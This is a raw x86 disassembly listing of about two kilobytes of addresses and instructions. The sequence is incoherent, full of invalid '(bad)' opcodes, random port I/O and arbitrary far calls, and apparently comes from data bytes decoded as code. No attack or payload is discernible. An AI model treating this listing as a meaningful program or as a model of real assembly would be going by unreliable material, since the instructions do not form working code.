  42755e:	rcr    DWORD PTR [edx-0x6f],cl
  427561:	jl     0x42757e
  427563:	daa    
  427564:	pop    ebp
  427565:	out    0x2c,al
  427567:	cdq    
  427568:	sbb    al,0x61
  42756a:	jmp    0x19fb218b
  42756f:	sub    al,0x93
  427571:	js     0x4275e3
  427573:	sahf   
  427574:	cwde   
  427575:	lahf   
  427576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427577:	mov    edi,0xa1030953
  42757c:	adc    BYTE PTR [ecx+esi*8],dh
  42757f:	ret    0xdc13
  427582:	dec    ecx
  427583:	inc    esi
  427584:	mov    bh,0x93
  427586:	xchg   ebx,eax
  427587:	and    al,0x4e
  427589:	leave  
  42758a:	dec    ebp
  42758b:	pop    edi
  42758c:	dec    ecx
  42758d:	call   0xd62f:0xa56683aa
  427594:	mov    edx,DWORD PTR [edx+0x47b25da9]
  42759a:	push   cs
  42759b:	push   eax
  42759c:	xor    eax,0xe68b4180
  4275a1:	iret   
  4275a2:	rcr    BYTE PTR [ecx-0x7f],1
  4275a5:	inc    esp
  4275a6:	mov    edx,0x15c8f39d
  4275ab:	mov    dh,0x31
  4275ad:	and    al,0x59
  4275af:	mov    dh,0x81
  4275b1:	mov    edx,0xa2da2a3d
  4275b6:	mov    ds:0x2d54385f,eax
  4275bb:	les    ebx,FWORD PTR es:[esi+0xc5eaab2]
  4275c2:	test   DWORD PTR [ecx-0x59438641],eax
  4275c8:	jns    0x427562
  4275ca:	aaa    
  4275cb:	or     DWORD PTR [edi+0x5d5f85a6],esi
  4275d1:	jp     0x427595
  4275d3:	xor    edx,edi
  4275d5:	mov    ?,WORD PTR [esi-0x64]
  4275d8:	adc    BYTE PTR [ebx+0x11],ah
  4275db:	fcom   QWORD PTR [esi-0x100c4420]
  4275e1:	out    dx,al
  4275e2:	nop
  4275e3:	and    DWORD PTR [esi-0x3ed60874],eax
  4275e9:	push   0xffffffe1
  4275eb:	xchg   BYTE PTR [ebp-0x4e],dh
  4275ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275ef:	gs nop
  4275f1:	mov    ebp,0xa2049834
  4275f6:	adc    ah,BYTE PTR [edi-0x13a2e8be]
  4275fc:	or     bl,dl
  4275fe:	das    
  4275ff:	mov    ebx,0xfff97bb1
  427604:	push   es
  427605:	mov    ch,0x3f
  427607:	mov    ebp,?
  427609:	mov    al,0x9f
  42760b:	xchg   ebp,eax
  42760c:	push   ebp
  42760d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42760e:	stc    
  42760f:	mov    ch,0x0
  427611:	pop    esp
  427612:	push   ebp
  427613:	add    DWORD PTR ds:0x82b0f21d,0x50
  42761a:	les    ecx,FWORD PTR [eax+0x452d5047]
  427620:	jge    0x42769b
  427622:	add    bl,dh
  427624:	mov    eax,ebx
  427626:	jb     0x427630
  427628:	out    dx,al
  427629:	fsubr  st(4),st
  42762b:	out    dx,al
  42762c:	sahf   
  42762d:	adc    ebx,DWORD PTR [esi-0x16]
  427630:	inc    esi
  427631:	outs   dx,DWORD PTR ds:[esi]
  427632:	ja     0x427616
  427634:	push   esi
  427635:	mul    BYTE PTR [esi+eax*1]
  427638:	adc    dh,BYTE PTR [esi+0x28]
  42763b:	(bad)  
  42763c:	clc    
  42763d:	pop    esi
  42763e:	data16 fisubr WORD PTR [ebp+ebp*4+0xf458f64]
  427646:	mov    eax,DWORD PTR [ecx-0x776e4034]
  42764c:	pop    ebx
  42764d:	repz stc 
  42764f:	dec    ebp
  427650:	mov    ah,0x77
  427652:	or     dh,BYTE PTR [ebx-0x2a]
  427655:	add    ebx,DWORD PTR [ecx-0x17]
  427658:	pushf  
  427659:	and    al,0xdd
  42765b:	test   al,0x83
  42765d:	sub    al,0x56
  42765f:	pop    es
  427660:	push   cs
  427661:	inc    esi
  427662:	pop    eax
  427663:	push   eax
  427664:	call   0xa1c5:0xe8a6e3ad
  42766b:	sbb    al,0x6a
  42766d:	inc    ebx
  42766e:	not    DWORD PTR [esi+0x5be17b82]
  427674:	fild   QWORD PTR [edx+ecx*4]
  427677:	dec    ebp
  427678:	dec    eax
  427679:	xor    dl,BYTE PTR [ecx]
  42767b:	aam    0x4f
  42767d:	out    0x64,al
  42767f:	xlat   BYTE PTR ds:[ebx]
  427680:	cmp    esp,DWORD PTR [ebx-0x28]
  427683:	jge    0x4276a9
  427685:	push   ds
  427686:	push   cs
  427687:	xor    ebp,ebp
  427689:	outs   dx,DWORD PTR ds:[esi]
  42768a:	icebp  
  42768b:	inc    esp
  42768c:	inc    ebp
  42768d:	loope  0x42768f
	...
  427697:	add    BYTE PTR [eax],al
  427699:	add    BYTE PTR [ecx-0x6600738],bl
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	addr16 push cs
  4276a8:	dec    edx
  4276a9:	shl    BYTE PTR [esp+ebp*8],cl
  4276ac:	add    DWORD PTR [eax],eax
  4276ae:	cld    
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    BYTE PTR [edx+0x77d320bc],cl
  4276b7:	sub    ebx,ecx
  4276b9:	(bad)  [edi]
  4276bb:	mov    esi,0x77ee9e3
  4276c0:	push   ebp
  4276c1:	and    al,0x9c
  4276c3:	push   cs
  4276c4:	pusha  
  4276c5:	je     0x4276b8
  4276c7:	out    0x70,al
  4276c9:	xchg   ecx,eax
  4276ca:	rol    DWORD PTR [ebp+eiz*4+0x7c],0x2
  4276cf:	inc    eax
  4276d0:	xlat   BYTE PTR ds:[ebx]
  4276d1:	dec    edi
  4276d2:	or     BYTE PTR [edx],ah
  4276d4:	add    bh,bl
  4276d6:	call   0x7d44b4a9
  4276db:	das    
  4276dc:	and    eax,0xf04138e3
  4276e1:	sahf   
  4276e2:	sub    al,0xd6
  4276e5:	ja     0x427757
  4276e7:	mov    bh,0x8e
  4276e9:	jmp    0x427727
  4276eb:	stos   DWORD PTR es:[edi],eax
  4276ec:	stc    
  4276ed:	ret    
  4276ee:	cwde   
  4276ef:	sub    eax,0xbc48a323
  4276f4:	pop    ss
  4276f5:	in     eax,0x3c
  4276f7:	cmc    
  4276f8:	mov    edx,0x7d66a429
  4276fd:	push   esp
  4276fe:	jecxz  0x427702
  427700:	into   
  427701:	clc    
  427702:	and    ah,BYTE PTR [ebp+0x64]
  427705:	push   0xffffff87
  427707:	lds    ebp,FWORD PTR [ebx]
  427709:	neg    DWORD PTR [ebp-0x5a84db96]
  42770f:	jne    0x4276c2
  427711:	pop    es
  427712:	mov    edi,0x4524e22b
  427717:	pop    edi
  427718:	test   al,0x48
  42771a:	outs   dx,DWORD PTR ds:[esi]
  42771b:	(bad)  
  42771c:	mov    edx,0x1ef1092c
  427721:	outs   dx,DWORD PTR ds:[esi]
  427722:	int3   
  427723:	cmc    
  427724:	pop    eax
  427725:	xchg   DWORD PTR [edi+0x66a252d0],ebp
  42772b:	fld    TBYTE PTR [eax+0x6c]
  42772e:	adc    bl,BYTE PTR [esi+edx*8-0x6f4635cb]
  427735:	dec    edx
  427736:	push   0x1a
  427738:	stc    
  427739:	push   edi
  42773a:	mov    eax,ds:0xe5065746
  42773f:	mov    BYTE PTR [ebx],0xd4
  427742:	jae    0x4276e1
  427744:	fild   WORD PTR [esp+eax*2]
  427747:	pop    edx
  427748:	cmc    
  427749:	scas   eax,DWORD PTR es:[edi]
  42774a:	xchg   esi,eax
  42774b:	mov    ch,0x59
  42774d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42774e:	shl    edx,cl
  427750:	fcomp  QWORD PTR [ecx+0xec93e29]
  427756:	test   eax,0x4fa08d22
  42775b:	jb     0x4276e3
  42775d:	sbb    DWORD PTR [ebx-0x3f],edi
  427760:	mov    dl,0x30
  427762:	inc    eax
  427763:	addr16 xchg ebp,eax
  427765:	add    DWORD PTR [esi-0x3eb8fc47],edx
  42776b:	mov    dh,0xdb
  42776d:	cli    
  42776e:	and    ebp,DWORD PTR [ebp+0x7c0883a3]
  427774:	fwait
  427775:	xchg   ebp,eax
  427776:	add    ch,BYTE PTR [ebp-0x5d6d847c]
  42777c:	add    BYTE PTR [eax-0xdfc85a9],dl
  427782:	jo     0x4277e8
  427784:	clc    
  427785:	addr16 and al,0xa3
  427788:	fcom   DWORD PTR [ebp-0x5e]
  42778b:	mov    DWORD PTR [edx-0x5f],eax
  42778e:	mov    eax,0x91bcf29c
  427793:	sbb    DWORD PTR [eax+0x7fd58688],esi
  427799:	push   0xffffff89
  42779b:	push   esi
  42779c:	shl    ah,1
  42779e:	push   0xc667b46f
  4277a3:	add    edx,edx
  4277a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277a6:	jo     0x4277b3
  4277a8:	lods   al,BYTE PTR ds:[esi]
  4277a9:	cmp    edx,DWORD PTR [ebx-0x5f4b23e2]
  4277af:	hlt    
  4277b0:	sbb    eax,eax
  4277b2:	mov    esp,0x31592e5c
  4277b7:	xchg   ebx,eax
  4277b8:	jl     0x4277e1
  4277ba:	xlat   BYTE PTR ds:[ebx]
  4277bb:	imul   eax,DWORD PTR [ebx-0x64],0xffffffa2
  4277bf:	mov    esi,0x7704d50e
  4277c4:	sub    bl,BYTE PTR [edx+eax*4]
  4277c7:	mov    BYTE PTR [esi-0x2b],bh
  4277ca:	mov    DWORD PTR [ebx-0x67],ecx
  4277cd:	xchg   cl,cl
  4277cf:	std    
  4277d0:	lahf   
  4277d1:	retf   
  4277d2:	idiv   DWORD PTR [ebp+0x7c18cfc0]
  4277d8:	adc    DWORD PTR [ebp+0x4f48665],eax
  4277de:	mov    dl,0x33
  4277e0:	and    eax,0xdfe45a48
  4277e5:	sti    
  4277e6:	mov    al,0xc3
  4277e8:	jl     0x4277f5
  4277ea:	gs cdq 
  4277ec:	imul   ebp,DWORD PTR [edx-0x2d],0xc133ce2d
  4277f3:	scas   al,BYTE PTR es:[edi]
  4277f4:	pop    esi
  4277f5:	fnstsw WORD PTR [ebx]
  4277f7:	sbb    al,0x33
  4277f9:	aam    0xab
  4277fb:	sbb    eax,0x90551456
  427800:	fiadd  DWORD PTR [edx-0x150e9bef]
  427806:	xchg   esp,eax
  427807:	xchg   ecx,eax
  427808:	pop    ebx
  427809:	pop    esp
  42780a:	sbb    eax,0xaf2246ae
  42780f:	mov    al,bh
  427811:	lahf   
  427812:	jbe    0x42788f
  427814:	push   ss
  427815:	sbb    BYTE PTR [ecx-0xbb1724b],cl
  42781b:	mov    al,BYTE PTR [eax-0x65]
  42781e:	and    dh,bh
  427820:	jp     0x4277cc
  427822:	xor    al,0x1d
  427824:	loope  0x42782b
  427826:	call   0x5b817730
  42782b:	push   ebp
  42782c:	fdivrp st(3),st
  42782e:	popf   
  42782f:	das    
  427830:	mov    cl,0x19
  427832:	outs   dx,DWORD PTR ds:[esi]
  427833:	outs   dx,BYTE PTR ds:[esi]
  427834:	xchg   BYTE PTR [eax-0x4aba8f99],bl
  42783a:	jae    0x427871
  42783c:	add    bl,BYTE PTR [ecx+0x26]
  42783f:	xrelease mov BYTE PTR [esi+0x13],bl
  427843:	pop    ss
  427844:	pop    ss
  427845:	mov    esi,0x303bf867
  42784a:	into   
  42784b:	sub    edx,ebx
  42784d:	jnp    0x4278a1
  42784f:	repnz sbb bh,ah
  427852:	mov    esi,0xead55e
  427857:	push   edx
  427858:	int3   
  427859:	sti    
  42785a:	sbb    dl,BYTE PTR [eax]
  42785c:	adc    bh,BYTE PTR [edi-0x9a6ef30]
  427862:	jns    0x42781b
  427864:	(bad)  
  427865:	sahf   
  427866:	sub    al,BYTE PTR [eax]
  427868:	aam    0x25
  42786a:	fs je  0x427855
  42786d:	aas    
  42786e:	jecxz  0x42780a
  427870:	into   
  427871:	push   edx
  427872:	daa    
  427873:	adc    al,0x1a
  427875:	adc    ah,ah
  427877:	out    0xca,eax
  427879:	xchg   esp,eax
  42787a:	ficomp WORD PTR [esi-0x890a7ac]
  427880:	xchg   al,ah
  427882:	adc    BYTE PTR [eax+0x1d],dh
  427885:	jle    0x42780c
  427887:	stos   DWORD PTR es:[edi],eax
  427888:	pushf  
  427889:	ficom  WORD PTR [ebx-0x5e25e112]
  42788f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427890:	xor    edx,DWORD PTR [edx-0x4a]
  427893:	jg     0x42790f
  427895:	mov    ds:0xcdec954e,eax
  42789a:	pop    ds
  42789b:	call   0x9dfa:0x7c408fdd
  4278a2:	ds nop
  4278a4:	xchg   ebx,eax
  4278a5:	aam    0x94
  4278a7:	ds das 
  4278a9:	or     al,0x32
  4278ab:	clc    
  4278ac:	mov    BYTE PTR [ecx+0x0],bh
	...
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	push   0x30326c0e
  4278cb:	out    dx,al
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	cld    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [ebx+0x1d76f08d],dl
  4278d7:	pusha  
  4278d8:	xchg   esp,eax
  4278d9:	retf   0xe52f
  4278dc:	mov    ds:0x64358663,eax
  4278e1:	outs   dx,DWORD PTR ds:[esi]
  4278e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278e3:	xchg   edi,eax
  4278e4:	std    
  4278e5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4278e7:	mov    al,ds:0xe0acbe37
  4278ec:	sbb    BYTE PTR [edx],dh
  4278ee:	add    al,0x39
  4278f0:	adc    BYTE PTR [edx+0x3c],bl
  4278f3:	mov    edx,0xd7830c2
  4278f8:	mov    cl,0x52
  4278fa:	sbb    eax,0xe5d21465
  4278ff:	sub    al,0x53
  427901:	test   al,0xa9
  427903:	std    
  427904:	mov    esi,edi
  427906:	xchg   esp,eax
  427907:	or     DWORD PTR [ebx],0xffffffc5
  42790a:	(bad)  
  42790c:	mov    ds:0xea23b3f1,eax
  427911:	push   esi
  427912:	lods   al,BYTE PTR ds:[esi]
  427913:	je     0x42789e
  427915:	adc    al,0xae
  427917:	sbb    eax,0x87b46a2b
  42791c:	mov    dh,BYTE PTR [edx+eiz*4-0x56f817a9]
  427923:	push   esi
  427924:	pop    eax
  427925:	fcom   QWORD PTR [edx+0x1f36918]
  42792b:	mov    bh,0xa6
  42792d:	sahf   
  42792e:	push   ss
  42792f:	or     al,0x4
  427931:	adc    ah,BYTE PTR [ecx+eiz*2+0x7de6fbbf]
  427938:	call   0x1ce9:0xb7e3c911
  42793f:	retf   
  427940:	repz adc cl,0x87
  427944:	push   ebx
  427945:	imul   edi,edx,0x5e
  427948:	jne    0x427915
  42794a:	out    dx,al
  42794b:	scas   eax,DWORD PTR es:[edi]
  42794c:	nop
  42794d:	ror    BYTE PTR [ebp-0x2c4ec31f],1
  427953:	sbb    ch,ah
  427955:	(bad)  
  427956:	rol    DWORD PTR [ecx],1
  427958:	mov    dl,0xcf
  42795a:	mov    esi,DWORD PTR [ecx-0x7a]
  42795d:	sbb    DWORD PTR [esi-0x29f2491a],esp
  427963:	xchg   edx,eax
  427964:	push   es
  427965:	ret    
  427966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427967:	movq   QWORD PTR [edi+0x3702228e],mm7
  42796e:	add    DWORD PTR [edi],ecx
  427970:	js     0x427973
  427972:	jnp    0x427916
  427974:	cwde   
  427975:	sti    
  427976:	xchg   edi,eax
  427977:	nop    edi
  42797a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42797b:	cdq    
  42797c:	xchg   esi,eax
  42797d:	rcl    DWORD PTR [eax+0x34],1
  427980:	cwde   
  427981:	into   
  427982:	adc    eax,edi
  427984:	cmp    BYTE PTR [edi-0x6c],cl
  427987:	inc    edx
  427988:	cmp    BYTE PTR [eax+eiz*2+0x60ceb6fc],dl
  42798f:	cld    
  427990:	sub    eax,0x86ed2b27
  427995:	pushf  
  427996:	(bad)  
  427997:	xor    ebx,eax
  427999:	imul   esi,DWORD PTR [edx],0x5a
  42799c:	stc    
  42799d:	cmp    DWORD PTR [esi+0xb1250ba],ebx
  4279a3:	out    0xeb,eax
  4279a5:	fsub   QWORD PTR [ecx]
  4279a7:	and    esi,DWORD PTR [edi-0x731c621b]
  4279ad:	and    al,0x98
  4279af:	xchg   ebp,eax
  4279b0:	sar    eax,cl
  4279b2:	pushf  
  4279b3:	cmp    dl,dh
  4279b5:	cwde   
  4279b6:	dec    edx
  4279b8:	leave  
  4279b9:	out    0x50,al
  4279bb:	fwait
  4279bc:	call   0xec60be75
  4279c1:	cmp    al,0x95
  4279c3:	adc    eax,0xf087ac9d
  4279c8:	sub    ah,BYTE PTR ds:0xe0578802
  4279ce:	neg    BYTE PTR [esi+0x10]
  4279d1:	xor    edi,ecx
  4279d3:	cmp    edx,esp
  4279d5:	call   0x7b68:0x93470a93
  4279dc:	pop    es
  4279dd:	out    0x70,eax
  4279df:	fiadd  DWORD PTR [eax+0x29]
  4279e2:	daa    
  4279e3:	push   eax
  4279e4:	test   al,0x95
  4279e6:	sbb    BYTE PTR [esi+0x2c],bh
  4279e9:	xchg   BYTE PTR [ebx-0x1d],cl
  4279ec:	xchg   ecx,eax
  4279ed:	dec    edi
  4279ee:	gs jo  0x427a70
  4279f1:	fdivr  QWORD PTR [edx+0x4e]
  4279f4:	outs   dx,DWORD PTR ds:[esi]
  4279f5:	mov    bl,0x76
  4279f7:	imul   cl
  4279f9:	scas   al,BYTE PTR es:[edi]
  4279fa:	push   ss
  4279fb:	jno    0x427a4d
  4279fd:	push   ds
  4279fe:	adc    al,0x68
  427a00:	sbb    dl,al
  427a02:	call   0xa84d1dae
  427a07:	jns    0x427a67
  427a09:	(bad)
  427a0c:	jno    0x427a8c
  427a0e:	mov    WORD PTR [ebx-0x777dbbc0],es
  427a14:	out    0xc5,eax
  427a16:	mov    cl,al
  427a18:	and    al,BYTE PTR [edi+ebx*4-0x6eac2aeb]
  427a1f:	into   
  427a20:	in     eax,dx
  427a21:	jecxz  0x427a79
  427a23:	mov    dl,BYTE PTR [ecx-0x61]
  427a26:	fst    DWORD PTR [esi+0x50a1e3db]
  427a2c:	xrelease xchg DWORD PTR es:[edx],ebx
  427a30:	push   esp
  427a31:	js     0x427a10
  427a33:	in     al,0xaa
  427a35:	out    dx,al
  427a36:	mov    BYTE PTR [edx],dl
  427a38:	cli    
  427a39:	fs jne 0x427a0d
  427a3c:	push   ss
  427a3d:	xchg   ebx,eax
  427a3e:	sub    al,0x8b
  427a40:	mov    ch,0x7d
  427a42:	pop    ss
  427a43:	(bad)  
  427a44:	mul    esp
  427a46:	xchg   DWORD PTR [ecx],edx
  427a48:	mov    dh,0x56
  427a4a:	xchg   DWORD PTR [eax+0x6],ebp
  427a4d:	ins    DWORD PTR es:[edi],dx
  427a4e:	in     al,0x82
  427a50:	jmp    0x51448ab1
  427a55:	inc    ebp
  427a56:	stos   DWORD PTR es:[edi],eax
  427a57:	xchg   edx,eax
  427a58:	pusha  
  427a59:	scas   al,BYTE PTR es:[edi]
  427a5a:	jo     0x427a0f
  427a5c:	mov    DWORD PTR [ecx+esi*2],edx
  427a5f:	test   BYTE PTR [edi],bl
  427a61:	sbb    DWORD PTR [eax],0x68
  427a64:	and    al,0x60
  427a66:	ror    edx,0x73
  427a69:	add    eax,0xfb804bfc
  427a6e:	mov    ch,0x4
  427a70:	ins    DWORD PTR es:[edi],dx
  427a71:	sub    al,BYTE PTR gs:[edi-0x13]
  427a75:	add    eax,0x6bb7676a
  427a7a:	cwde   
  427a7b:	cmp    BYTE PTR [edi],ah
  427a7d:	cs cld 
  427a7f:	adc    cl,ah
  427a81:	(bad)  
  427a82:	sti    
  427a83:	sbb    BYTE PTR [ebx+0x7bff4e74],cl
  427a89:	ss push edi
  427a8b:	aas    
  427a8c:	cld    
  427a8d:	and    BYTE PTR [ecx+esi*2+0x3ad52516],bh
  427a94:	mov    al,0x57
  427a96:	psubsw mm6,mm2
  427a99:	mov    dl,0xcf
  427a9b:	mov    dh,BYTE PTR [esi+esi*1]
  427a9e:	mov    esp,0xe72ff3eb
  427aa3:	retf   
  427aa4:	loop   0x427a88
  427aa6:	mov    bl,0x18
  427aa8:	inc    ebx
  427aa9:	sub    eax,0x81f44579
  427aae:	inc    ecx
  427aaf:	xchg   esi,eax
  427ab0:	int3   
  427ab1:	add    edi,edi
  427ab3:	and    BYTE PTR [ebx-0xc],ch
  427ab6:	cmc    
  427ab7:	test   eax,0xf86e834b
  427abc:	sbb    bl,cl
  427abe:	jmp    0xc96da768
  427ac3:	cmp    al,0x66
  427ac5:	nop
  427ac6:	ret    0xc55b
  427ac9:	add    esp,ebx
  427acb:	(bad)  
  427acd:	pop    ecx
	...
  427ada:	pop    ecx
  427adb:	add    eax,ecx
  427add:	inc    esp
  427ade:	fcmovnb st,st(6)
  427ae0:	fstp   QWORD PTR [edi]
  427ae2:	arpl   WORD PTR [edi-0x348ab294],di
  427ae8:	dec    edi
  427ae9:	mov    al,ds:0x1f02c
  427aee:	cld    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    ah,dh
  427af3:	sub    al,0x9c
  427af5:	into   
  427af6:	and    ebx,DWORD PTR [edi-0x22]
  427af9:	sub    eax,DWORD PTR [esp+eiz*2+0x60e9d0be]
  427b00:	mov    esi,0xc08c78fb
  427b05:	xor    al,0xc4
  427b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b08:	jmp    0x427adb
  427b0a:	jl     0x427b5a
  427b0c:	fiadd  WORD PTR [ebp-0x5d1abbcf]
  427b12:	stc    
  427b13:	iret   
  427b14:	fwait
  427b15:	pusha  
  427b16:	aas    
  427b17:	adc    bl,al
  427b19:	mov    al,0x7e
  427b1b:	push   ebx
  427b1c:	addr16 mov dl,0x62
  427b1f:	xchg   DWORD PTR [edx+0x0],ebp
  427b22:	cld    
  427b23:	xor    ah,BYTE PTR [edx-0x7b]
  427b26:	jl     0x427af9
  427b28:	xchg   ecx,eax
  427b29:	pop    ebp
  427b2a:	adc    eax,edi
  427b2c:	out    0x6b,eax
  427b2e:	fdiv   DWORD PTR [edx]
  427b30:	add    al,0xd0
  427b32:	stc    
  427b33:	mov    BYTE PTR ds:0xef23b24d,ah
  427b39:	mov    WORD PTR [esi],ss
  427b3b:	aam    0x51
  427b3d:	adc    DWORD PTR [ecx-0x6b323692],0x25
  427b44:	test   BYTE PTR [ecx],bl
  427b46:	mov    eax,0x4d86aaf5
  427b4b:	sub    DWORD PTR [ebx+0x30f0c553],esi
  427b51:	mov    edi,0xabd60793
  427b56:	mov    esp,0xc7b109ef
  427b5b:	inc    ecx
  427b5c:	jmp    0x5dd1:0xb135f2a6
  427b63:	imul   edi,DWORD PTR [ecx-0x6df31c47],0xff4940b3
  427b6d:	or     eax,0xa59a2794
  427b72:	mov    edi,DWORD PTR [eax]
  427b74:	lahf   
  427b75:	jns    0x427b18
  427b77:	dec    ecx
  427b78:	daa    
  427b79:	dec    esp
  427b7a:	jbe    0x427b7c
  427b7c:	in     eax,dx
  427b7d:	dec    edi
  427b7e:	mov    ah,BYTE PTR [esi-0x1e7a0c37]
  427b84:	cmp    al,BYTE PTR [edi+0x3398755a]
  427b8a:	pop    ebx
  427b8b:	lea    ecx,[esi]
  427b8d:	push   ebp
  427b8e:	popf   
  427b8f:	jmp    0xb0105e09
  427b94:	push   cs
  427b95:	or     BYTE PTR [bp+si-0x4714],0xb5
  427b9b:	ins    BYTE PTR es:[edi],dx
  427b9c:	and    ebx,DWORD PTR [edx]
  427b9e:	mov    esi,0xbe909dc1
  427ba3:	jb     0x427bbd
  427ba5:	loop   0x427b47
  427ba7:	push   bx
  427ba9:	mov    ah,0xc0
  427bab:	enter  0xcf83,0x44
  427baf:	fnstcw WORD PTR [ecx+0x12]
  427bb2:	into   
  427bb3:	xchg   ecx,eax
  427bb4:	cmp    al,0x3d
  427bb6:	mov    bl,0xab
  427bb8:	not    ah
  427bba:	data16 adc bh,BYTE PTR [edi]
  427bbd:	dec    esp
  427bbe:	xchg   edx,eax
  427bbf:	mov    edx,DWORD PTR [ecx+0x2f]
  427bc2:	(bad)  
  427bc3:	(bad)  
  427bc4:	or     eax,DWORD PTR [ecx+0x791753b]
  427bca:	ss and bl,dl
  427bcd:	retf   0xdada
  427bd0:	aad    0x46
  427bd2:	pop    esi
  427bd3:	jnp    0x427c38
  427bd5:	mov    ah,0xc1
  427bd7:	or     BYTE PTR [edx+0x275159d7],0xc6
  427bde:	shl    DWORD PTR [edx+0x6d],cl
  427be1:	mov    di,0x17bb
  427be5:	arpl   sp,ax
  427be7:	stc    
  427be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427be9:	push   esp
  427bea:	test   esp,edx
  427bec:	lds    esi,FWORD PTR [ecx-0x6e]
  427bef:	jbe    0x427bd2
  427bf1:	jle    0x427b99
  427bf3:	out    0x44,eax
  427bf5:	cmp    ebx,ebx
  427bf7:	pop    ebp
  427bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bf9:	leave  
  427bfa:	xor    BYTE PTR [esi-0x56],dh
  427bfd:	test   DWORD PTR [ecx],0x467f6863
  427c03:	cld    
  427c04:	pop    ss
  427c05:	out    0xd2,al
  427c07:	imul   eax,DWORD PTR [esi+edi*2+0x6c],0x3d
  427c0c:	and    eax,ebp
  427c0e:	sbb    dh,BYTE PTR [ebx+0x73]
  427c11:	ins    DWORD PTR es:[edi],dx
  427c12:	or     DWORD PTR [bp+0x1],esi
  427c16:	or     cl,BYTE PTR [ecx-0x3cfc78f1]
  427c1c:	scas   al,BYTE PTR es:[edi]
  427c1d:	jno    0x427c07
  427c1f:	call   0x94f9ecb5
  427c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c25:	shl    BYTE PTR [esi-0x34e86bdc],0x9f
  427c2c:	cs add al,0x2d
  427c2f:	adc    ebp,ebp
  427c31:	push   edx
  427c32:	sbb    BYTE PTR [edi-0x1c3cffe0],0xea
  427c39:	outs   dx,DWORD PTR ds:[esi]
  427c3a:	ss out 0xd7,eax
  427c3d:	xchg   edx,eax
  427c3e:	inc    ebx
  427c3f:	mov    ebx,0x38cd0059
  427c44:	add    ch,BYTE PTR [esi-0x56]
  427c47:	(bad)  [ebp-0x10]
  427c4a:	enter  0xab58,0x8
  427c4e:	xor    BYTE PTR [esi+eiz*8],ah
  427c51:	xor    BYTE PTR [esi-0x16],bl
  427c54:	in     al,dx
  427c55:	cmp    BYTE PTR [edx+edx*4-0x6cf96c67],dh
  427c5c:	loope  0x427c42
  427c5e:	jb     0x427cb8
  427c60:	jg     0x427c6b
  427c62:	fwait
  427c63:	popa   
  427c64:	sbb    BYTE PTR [ebx],bl
  427c66:	faddp  st(5),st
  427c68:	push   0xb5f5e132
  427c6d:	in     eax,dx
  427c6e:	aad    0x36
  427c70:	jle    0x427c8c
  427c72:	mov    ebp,0x5a734c6c
  427c77:	add    al,0x91
  427c79:	cmp    al,0xbf
  427c7b:	push   ebp
  427c7c:	bound  esp,QWORD PTR [eax]
  427c7e:	sbb    DWORD PTR [eax+0x16631679],ebp
  427c84:	pushf  
  427c85:	push   ecx
  427c86:	sbb    cl,BYTE PTR [edx]
  427c88:	cmp    BYTE PTR [esi],0xc9
  427c8b:	(bad)  
  427c8c:	(bad)  
  427c8d:	push   edi
  427c8e:	mov    edi,0x58d9ba5f
  427c93:	in     al,0x8
  427c95:	mov    eax,0x1d12574f
  427c9a:	arpl   WORD PTR [ecx-0x77],sp
  427c9d:	and    ebp,DWORD PTR [ebp+0x7a]
  427ca0:	cmp    DWORD PTR [eax-0x2685a1ea],esp
  427ca6:	xchg   ebx,eax
  427ca7:	mov    DWORD PTR [ebx],ebx
  427ca9:	pop    ecx
  427caa:	popa   
  427cab:	cmp    eax,0x5d0504ee
  427cb0:	ret    0xf293
  427cb3:	push   esi
  427cb4:	lods   eax,DWORD PTR ds:[esi]
  427cb5:	fiadd  WORD PTR [edi]
  427cb7:	push   0xfffffff7
  427cb9:	cdq    
  427cba:	dec    eax
  427cbb:	sbb    ebp,DWORD PTR [eax]
  427cbd:	xchg   edi,eax
  427cbe:	pop    ecx
  427cbf:	mov    bl,0x21
  427cc1:	mov    eax,DWORD PTR [ebx]
  427cc3:	lgs    edi,FWORD PTR [eax+0xe33cedf]
  427cca:	lods   al,BYTE PTR ds:[esi]
  427ccb:	dec    edx
  427ccc:	stos   DWORD PTR es:[edi],eax
  427ccd:	cdq    
  427cce:	mov    bl,0x38
  427cd0:	mul    BYTE PTR [esp+ecx*4-0x69]
  427cd4:	xchg   esi,eax
  427cd5:	(bad)  
  427cd6:	in     eax,dx
  427cd7:	lea    esp,[edi-0x80]
  427cda:	dec    edi
  427cdb:	mov    eax,ds:0xb24dbba8
  427ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ce1:	loopne 0x427d53
  427ce3:	sub    BYTE PTR [eax],al
  427ce5:	add    bl,bh
  427ce7:	xor    edi,DWORD PTR [esi-0x11101141]
  427ced:	or     BYTE PTR [eax],al
	...
  427cf7:	add    BYTE PTR [eax],al
  427cf9:	add    BYTE PTR [ebx],bl
  427cfb:	daa    
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	imul   eax,DWORD PTR [eax-0xdd73d41],0x1fc0001
  427d10:	add    BYTE PTR [eax],al
  427d12:	shl    DWORD PTR [edi-0x73],1
  427d15:	pushf  
  427d16:	lods   al,BYTE PTR ds:[esi]
